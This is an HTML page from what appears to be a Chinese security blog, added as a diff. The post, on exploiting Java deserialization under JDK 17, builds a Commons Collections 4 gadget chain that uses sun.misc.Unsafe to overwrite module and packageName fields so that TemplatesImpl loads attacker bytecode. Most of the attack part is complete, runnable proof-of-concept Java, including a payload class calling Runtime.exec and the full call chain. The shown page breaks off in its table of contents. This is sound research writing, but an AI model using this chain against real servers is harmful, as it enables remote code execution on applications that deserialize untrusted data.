@@ -1,0 +1,1016 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>jdk17&amp;CC链下利用TemplatesImpl | Jiecub3</title>
+<meta name="keywords" content="">
+<meta name="description" content="0x01 前言 起因看到一篇文章说jdk17因为强封装（模块化），利用不了TemplatesImpl来作为反序列化的sink点了，于是去试了下。起初先">
+<meta name="author" content="Jiecub3">
+<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
+<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="jdk17&amp;CC链下利用TemplatesImpl" />
+<meta property="og:description" content="0x01 前言 起因看到一篇文章说jdk17因为强封装（模块化），利用不了TemplatesImpl来作为反序列化的sink点了，于是去试了下。起初先" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-01-10T20:01:23+08:00" />
+<meta property="article:modified_time" content="2025-01-10T20:01:23+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="jdk17&amp;CC链下利用TemplatesImpl"/>
+<meta name="twitter:description" content="0x01 前言 起因看到一篇文章说jdk17因为强封装（模块化），利用不了TemplatesImpl来作为反序列化的sink点了，于是去试了下。起初先"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Jiecub3.github.io/zh/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "jdk17\u0026CC链下利用TemplatesImpl",
+      "item": "https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "jdk17\u0026CC链下利用TemplatesImpl",
+  "name": "jdk17\u0026CC链下利用TemplatesImpl",
+  "description": "0x01 前言 起因看到一篇文章说jdk17因为强封装（模块化），利用不了TemplatesImpl来作为反序列化的sink点了，于是去试了下。起初先",
+  "keywords": [
+    
+  ],
+  "articleBody": "0x01 前言 起因看到一篇文章说jdk17因为强封装（模块化），利用不了TemplatesImpl来作为反序列化的sink点了，于是去试了下。起初先写了个小demo，发现可以调用呀，然后就想搞一条完整的链子，然后这里选择的是CC4，因为他最后sink点就是TemplatesImpl,当然CC6，CC7，CC5改改应该也可以（CC5起点也要换），但是我懒就直接用CC4了。在jdk17 Module模式下，CC6可以直接套一层Unsafe就能直接rce了，但是实现加载字节码可以做更多事，于是俺研究了下，也是解决重重困难实现了最后的利用！\n环境 jdk17.0.8 pom.xml javassist javassist 3.12.1.GA org.apache.commons commons-collections4 4.0 jdk17 模块检测\n早在jdk9就开始了模块化，但是真正实施是在jdk17。模块化简单理解将就是 java为了安全有一些类不想让你直接调用，但是java模块里面的类又需要相互调用，所以反射和new一个对象的时候会对调用类和被调用类进行一个模块检测（这里不只是检测调用和被调用类的模块关系，还有其他判断），好这里我们大概有个概念，jdk17 会进行模块检测\n0x02 初见端倪 先来看个小demo，这里需要用到Unsafe，不懂的同学可以先看看这个，简单说Unsafe这里是用来修改我们调用类的模块，从而绕过模块检测。\nUnsafe是一个偏底层的函数，我们这里是通过找到Field的地址，然后修改其指向我们设置的值\nTemplatesImpl test import javassist.ClassPool; import javassist.CtClass; import sun.misc.Unsafe; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; public class test_17 { public static void main(String[] args) throws Exception { System.out.println(Class.class.getModule().getName()); ClassPool pool = ClassPool.getDefault(); ClassLoader appClassLoader = ClassLoader.getSystemClassLoader(); pool.insertClassPath(new javassist.LoaderClassPath(appClassLoader)); CtClass clazz = pool.get(\"eval\"); byte[] code = clazz.toBytecode(); CtClass clazz2 = pool.get(Evil.class.getName()); byte[] code2 = clazz2.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); Class\u003c?\u003e aClass = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); patchModule(test_17.class,aClass); System.out.println(test_17.class.getModule().getName()); Object o = aClass.getDeclaredConstructor().newInstance(); setFiled(o,\"_name\",\"111\"); setFiled(o,\"_bytecodes\",new byte[][]{code,code2}); setFiled(o,\"_transletIndex\",0); //setFiled(o,\"_auxClasses\",new HashMap\u003c\u003e()); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o); oos.close(); patchModule(test_17.class,eval.class); System.out.println(test_17.class.getModule().getName()); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); Templates o1 = (Templates) ois.readObject(); o1.getOutputProperties(); ois.close(); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } demo中在反射前执行patchModule(test_17.class,aClass);修改模块，然后反序列化后调用getOutputProperties触发sink，然后这里生成bin文件后，注释掉前面代码，执行readobject是可以执行成功的。这里我就感觉好像跟我想的有点不一样了，我之前看那篇文章以为只要实例化类就会进行模块的检测。但是很显然这里肯定没有。\n0x03 构造 然后就开始尝试构造了\n1.eval.class 首先是恶意类，这里我没有继承AbstractTranslet，因为有模块检测那个东西，反正我当时很多报错，我就直接删了，这里分析代码可以用另一种方法代替\nimport java.io.IOException; public class eval { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { throw new RuntimeException(e); } } public Class\u003c?\u003e getSuperclass(){ return eval.class; } } 尝试\n开始尝试过重写getSuperclass()方法绕过if判断，后面发现重写不了这个，原因应该是：这里_class[i]属于Class对象，然后Class是final不让继承，然后也就重写不了了\n解决\n那么这里会进入else，_auxClasses正常是null所以这里会空指针报错。但是这个值不能反射设置，这个值最后还是属于Hashtable，但是Hashtable不继承Serializable。那就看那些地方会对这个值进行赋值，看我们能不能调用到\n发现就在defineTransletClasses()上方就有，只要_bytecodes.length\u003e1就行，ez很好满足\nsetFiled(templates,\"_bytecodes\",new byte[][]{code,code2}); 这样设置就解决了，然后以为套一层Unsafe就能实现时，最大的问题来了\n2. boss newInstance 在transform最后调用点，TrAXFilter的实例化是通过newInstance实现，而这个属于反射，这里会进行模块检测！！！\n起初在poc中写句patchModule(invokerTransformer.getClass(),aClass);（aClass就是TrAXFilter.class），可以成功调用，但是下意识就反应到这是本地，客户端和服务端是一体的。相当于这个也修改了服务端invokerTransformer的模块hhh。\n然后这里沉思了下，能不能通过CC链中Transformer[]的构造执行patchModule()中的代码（Unsafe那块代码，修改模块），修改完模块然后再调用CC4后面的sink，然后拼接到一个Transformer[]里面进行利用\n然后看了下ConstantTransformer，发现返回的对象，和接收input没半毛钱关系，所以上面想法是可行的\npublic O transform(final I input) { return iConstant; } 2.1 怎么实现Unsafe 说干就干，慢着，你是说用invokerTransformer来实现下面这段代码？\nprivate static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } 我们化简，也就要执行unsafe.getAndSetObject(currentClass,addr,ObjectModule);这句代码\n那就要好好理解invokerTransformer.transform中的逻辑了\npublic O transform(final Object input) { //化简下 final Class\u003c?\u003e cls = input.getClass(); final Method method = cls.getMethod(iMethodName, iParamTypes); return (O) method.invoke(input, iArgs); 尝试 那我们能不能直接传个Unsafe对象呢？no Unsafe不能反序列化\n后面想到getRuntime,然后去看发现有getUnsafe可以获得Unsafe对象 但是其实用不了hhh，不然干嘛还通过反射获得Unsafe对象嘛hhh。该方法还有@CallerSensitive这个注释会对调用者的classLoader进行检查，判断当前类是否由Bootstrap classLoader加载，如果不是的话就会抛出一个SecurityException异常。\n因为受到Runtime的构造和final Class\u003c?\u003e cls = input.getClass();这句代码的影响，我一直觉得要得到Unsafe对象才能进行调用。因为你传入的Unsafe.class经过input.getClass()，都会变成Class.class，会没有用的。我昨天这里一度以为无解了hhh 后面我一直看代码，发现getRuntime费那么大劲是因为Class没这个方法，但是有getDeclaredField，setAccessible这些方法。而Runtime对象也是为了exec的调用，并不是前面就要有对象才能调用。而且前面调用(Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\");)本来就是通过Unsafe.class调用的，而不是Unsafe对象调用的，怎么就不能调用了？\n这个想法通尝试发现是可以，但是又有个问题 unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); theUnsafe是private，setAccessible这个调用不能少，就意味着unsafeField这个Filed对象得被调用两次，但是这在invokerTransformer中怎么可能实现呢？于是我想了能不能在外面执行unsafeField.setAccessible(true);，然后把unsafeField传到invokerTransformer中，其实不行Field也不继承Serializable啊，想p吃呢hhh\n解决 然后又思考了片刻，如果靠链子解决的话，那大概需要一个这样的结构吧\npublic T transform(final T input) { iTransformer.transform(input); return input; } 这里iTransformer.transform(input);去执行unsafeField.setAccessible(true);这段内容，执行完后还能返回之前的对象，后面正常调用。这样大概就能实现同一个对象被调用2次了！\n然后我就去找实现transform方法的类，其实不多，但是找下来基本上没什么吊用？但是注意到有一些类有execute，evaluate方法，但是实现transform方法的类里面又没看到那个对这个两个方法进行了调用。这里稍微有点蹊跷了，然后又去网上找了下思路，就看到之前CC改编的一些链子。然后看到一个对create()方法的调用，然后这个类其实没实现transform，但是他有create()。这里我也有点感觉了那execute，evaluate方法也很有可能是想用一个包下的类，于是我就去这个包下面一通找，hhh如果让我发现了点什么hhh\n我之所以会有上面这个想法，也是找transform()方法的时候，看到下面这两个调用，就很符合我的思路（看代码注释！）\nClosureTransformer public T transform(final T input) { iClosure.execute(input); //只要execute中可以控制调用transform，即可 return input; } IfTransformer public O transform(I input) { return this.iPredicate.evaluate(input) ? this.iTrueTransformer.transform(input) : this.iFalseTransformer.transform(input); //因为这里是三元表达式，所以其实会执行两句代码 //所以这里 evaluate(input) 可以控制调用transform，即可 } 然后其实感觉找到了很多可以用的。先写比较麻烦的吧，因为好用的都是后面才遇到wwww(调用想法就写到代码注释里吧方便点\n找到的一些类 ComparatorPredicate public boolean evaluate(final T target) { boolean result = false; final int comparison = comparator.compare(object, target);//这里是看到了compare，然后CC4这条链子也是有这个调用点，然后想能不能通过这里调用到transform，看了下compare()相关代码感觉是可行的但是有点麻烦 switch (criterion) { case EQUAL: result = comparison == 0; break; case GREATER: result = comparison \u003e 0; break; case LESS: result = comparison \u003c 0; break; case GREATER_OR_EQUAL: result = comparison \u003e= 0; break; case LESS_OR_EQUAL: result = comparison \u003c= 0; break; default: throw new IllegalStateException(\"The current criterion '\" + criterion + \"' is invalid.\"); } return result; } EqualPredicate public boolean evaluate(final T object) { if (equator != null) { return equator.equate(iValue, object); //这个是想到equate，equals也有相关的链子，这个未证实，感觉有就记录了 } else { return iValue.equals(object); } } 比较好用的 TransformerPredicate public boolean evaluate(final T object) { final Boolean result = iTransformer.transform(object);//这个需要有结果，但是setAccessible返回是void，所以这个可能用不了 if (result == null) { throw new FunctorException( \"Transformer must return an instanceof Boolean, it was a null object\"); } return result.booleanValue(); } 好用的\nTransformedPredicate public boolean evaluate(final T object) { final T result = iTransformer.transform(object); //这里不就完美了么hhh return iPredicate.evaluate(result); } TruePredicate public boolean evaluate(final T object) { return true; //这个控制下iPredicate.evaluate(result);结果，增加链子稳定性 } 最好用的\n这个是我唯一记录的一个execute方法的，但确实最好用的www，不是哥们？你直接就是梦中情execute\nTransformerClosure public void execute(final E input) { iTransformer.transform(input); } demo 那么我最后选择了这套组合\nClosureTransformer public T transform(final T input) { iClosure.execute(input); return input; } TransformerClosure public void execute(final E input) { iTransformer.transform(input); } 可以成功得到Unsafe对象，nice捏，这里我就直接拿我测试的poc了\nimport org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.*; import sun.misc.Unsafe; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Class\u003c?\u003e TrAXFilter = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(TrAXFilter); long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"packageName\")); // // System.out.println(addr); // System.out.println(Class.class.getModule().getClass()); // System.out.println(\"1111\"+TrAXFilter.getPackageName()); // unsafe.getAndSetObject(TrAXFilter,addr,\"javax.xml\"); // System.out.println(Class.class.getDeclaredField(\"packageName\")); // System.out.println(ObjectModule); // System.out.println(ObjectModule.getClass().getName()); // Class\u003c?\u003e TrAXFilter2 = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"); // System.out.println(\"222\"+TrAXFilter2.getPackageName()); // final Class\u003c?\u003e cls = input.getClass(); // final Method method = cls.getMethod(iMethodName, iParamTypes); // return (O) method.invoke(input, iArgs); // InvokerTransformer invokerTransformer4 = new InvokerTransformer(\"getAndSetObject\",new Class[]{Object.class,long.class,Object.class}, new Object[]{Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"),60,\"javax.xml\"}); InvokerTransformer invokerTransformer3 = new InvokerTransformer(\"get\",new Class[]{Object.class}, new Object[]{null}); InvokerTransformer invokerTransformer2 = new InvokerTransformer(\"setAccessible\",new Class[]{boolean.class}, new Object[]{true}); TransformerClosure transformerClosure = new TransformerClosure(invokerTransformer2); ClosureTransformer ClosureTransformer = new ClosureTransformer(transformerClosure); InvokerTransformer invokerTransformer = new InvokerTransformer(\"getDeclaredField\",new Class[]{String.class}, new Object[]{\"theUnsafe\"}); ConstantTransformer constantTransformer = new ConstantTransformer(UnsafeClass); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3}; Transformer keyTransformer = new ChainedTransformer(transformers); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(keyTransformer); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); Transformer o1 = (Transformer) ois.readObject(); ois.close(); // System.out.println(Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\").getPackageName()); Object transform = o1.transform(null); System.out.println(transform); // System.out.println(Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\").getPackageName()); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } } 2.2 Module 本以为最难的问题已经解决了，但是又用新的问题了wwww\n后面其实就只是调用unsafe.getAndSetObject，他的参数都可以传然后调用。正当我这么想的时候突然一阵不好的预感\nunsafe.getAndSetObject(currentClass,addr,ObjectModule); 这里addr是一个long值，可以直接传，但是ObjectModule是一个Module类啊，不能反序列化，而且也不能通过前面的CC链transform构造，因为你构造出来也传不到参数的地方吧！www，这截止比上一个更卡死，简直无解！\n2.3 pn 没办法，只能抱着最后一丝希望去看看newInstance，是怎么进行模块检测的，看能不能通过其他方法绕过\n然后调试 调试 调试 啊 发现起初就是这个地方给我们return false的\n往下看，可以看到进行了模块比较，一样的话直接就会返回true\n然后后面会进去到Module类，这里调用的是被调用类（TrAXFilter）的Module.isExported\n然后跟到implIsExportedOrOpen，然后发现了这个isNamed()，这里代码意思是被调用类没有模块名字的话就直接返回true\n那简单呀用Unsafe把TrAXFilter的Module.name改了不久行了，这个想法我起初也觉得快成了。但其实Module类做了防护，java不会让我们得到这个的类Field。getDeclaredFields()出来都是空的。\n然后还想过能不能直接把Module设置成null呀，null能反序列化呀，其实纯扯，在进入isExported方法时其实就会报空指针错误！\n然后第二个和第三个if都没希望的，this==other的话前面代码就返回true了，然后isOpen()是false\n那只有最后点希望咯，跟进isStaticallyExportedOrOpen\n上面那个ifopenPackages是null，根本操作不了，然后看到下面这个if\n这个exportedPackages是一个Hashmap，会从这里面获取值，还记得这个pn是什么，是被调用类的模块名(com.sun.org.apache.xalan.internal.xsltc.trax),正常这里是没有对应的key，返回null的。\n我们跟进allows，wc，发现只要targets不为null，怎么样都返回true啊啊啊啊（下图是我已经操作过的，targets会有值\n也就是pn只要是exportedPackages中的任意一个key值不就行了，我们再回想下pn怎么来的\nString pkg = memberClass.getPackageName();//pkg就是pn return memberModule.isExported(pkg, currentModule); Class.class中 public String getPackageName() { String pn = this.packageName; if (pn == null) { ... } return pn; } 可以看到就是Class类中packageName属性，这还不容易？，Class类中module属性，我都能改，还改不你了？\n直接用Unsafe修改了packageName\n0x04 poc 心心念念的poc呜呜呜\n//import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; //import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.*; import sun.misc.Unsafe; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.PriorityQueue; public class CC4_17 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); ClassLoader appClassLoader = ClassLoader.getSystemClassLoader(); pool.insertClassPath(new javassist.LoaderClassPath(appClassLoader)); CtClass clazz = pool.get(\"eval\"); byte[] code = clazz.toBytecode(); CtClass clazz2 = pool.get(Evil.class.getName());//这里随便一个类就行，code2凑数用的 byte[] code2 = clazz2.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); Class\u003c?\u003e aClass = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); patchModule(CC4_17.class,aClass); Object templates = aClass.getDeclaredConstructor().newInstance(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code,code2}); setFiled(templates,\"_transletIndex\",0); Class\u003c?\u003e TrAXFilter = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"); InstantiateTransformer invokerTransformer5 = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); ConstantTransformer constantTransformer2 = new ConstantTransformer(TrAXFilter); InvokerTransformer invokerTransformer4 = new InvokerTransformer(\"getAndSetObject\",new Class[]{Object.class,long.class,Object.class}, new Object[]{Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"),60,\"javax.xml\"}); InvokerTransformer invokerTransformer3 = new InvokerTransformer(\"get\",new Class[]{Object.class}, new Object[]{null}); InvokerTransformer invokerTransformer2 = new InvokerTransformer(\"setAccessible\",new Class[]{boolean.class}, new Object[]{true}); TransformerClosure transformerClosure = new TransformerClosure(invokerTransformer2); ClosureTransformer ClosureTransformer = new ClosureTransformer(transformerClosure); InvokerTransformer invokerTransformer = new InvokerTransformer(\"getDeclaredField\",new Class[]{String.class}, new Object[]{\"theUnsafe\"}); ConstantTransformer constantTransformer = new ConstantTransformer(Class.forName(\"sun.misc.Unsafe\")); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3,invokerTransformer4,constantTransformer2,invokerTransformer5}; Transformer keyTransformer = new ChainedTransformer(transformers); // patchModule(invokerTransformer.getClass(),aClass); System.out.println(TrAXFilter.getModule().getName()); System.out.println(invokerTransformer.getClass().getModule().getName()); TransformingComparator transformingComparator = new TransformingComparator(keyTransformer); PriorityQueue priorityQueue = new PriorityQueue(2,transformingComparator); patchModule(CC4_17.class,priorityQueue.getClass()); Field size = priorityQueue.getClass().getDeclaredField(\"size\"); size.setAccessible(true); size.setInt(priorityQueue, 2); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(priorityQueue); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } 调用链 PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ---\u003e 这里开始构造Unsafe对象，得到Filed对象 ClosureTransformer.transform() ---\u003e 这里形成一个岔路，去构造setAccessible TransformerClosure.transform() InvokerTransformer.transform() ---\u003e 这里执行setAccessible，然后又回到主线 InvokerTransformer.transform() ---\u003e 执行get()，得到Unsafe对象 InvokerTransformer.transform()\t---\u003e 执行getAndSetObject，修改pn ConstantTransformer.transform() ---\u003e这里回到正常CC4链子 InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() 0x05 遗漏 写文章的时候看代码越看越感觉漏掉了什么，还记得我前面说到的一个利用尝试\"null\"，这个地方我分析的时候，把memberClass想成null了，其实不是，是memberClass.getModule()为null\n那么有点感觉了么少年？我tm直接把这两个的Moudle都用Unsafe改成null呗，经过俺的改造，Unsafe对象调用两次完全不是问题啊\n感觉是可行的，但是我懒，俺要去吃饭了，都9点了才写完！！\n",
+  "wordCount" : "6214",
+  "inLanguage": "zh",
+  "datePublished": "2025-01-10T20:01:23+08:00",
+  "dateModified": "2025-01-10T20:01:23+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Jiecub3"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Jiecub3",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Jiecub3.github.io/img/logo.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://Jiecub3.github.io/zh/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
+                    <span>搜索🔍︎</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      jdk17&amp;CC链下利用TemplatesImpl
+    </h1>
+    <div class="post-meta"><span title='2025-01-10 20:01:23 +0800 CST'>2025-01-10</span>&nbsp;·&nbsp;13 分钟&nbsp;·&nbsp;Jiecub3
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#0x01-%e5%89%8d%e8%a8%80" aria-label="0x01 前言">0x01 前言</a><ul>
+                            
+                    <li>
+                        <a href="#%e7%8e%af%e5%a2%83" aria-label="环境"><strong>环境</strong></a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#0x02-%e5%88%9d%e8%a7%81%e7%ab%af%e5%80%aa" aria-label="0x02 初见端倪">0x02 初见端倪</a><ul>
+                            <ul>
+                            
+                    <li>
+                        <a href="#templatesimpl-test" aria-label="TemplatesImpl test">TemplatesImpl test</a></li></ul>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#0x03-%e6%9e%84%e9%80%a0" aria-label="0x03 构造">0x03 构造</a><ul>
+                            <ul>
+                            
+                    <li>
+                        <a href="#1evalclass" aria-label="1.eval.class">1.eval.class</a></li></ul>
+                        
+                    <li>
+                        <a href="#2-boss-newinstance" aria-label="2. boss newInstance">2. boss newInstance</a><ul>
+                            
+                    <li>
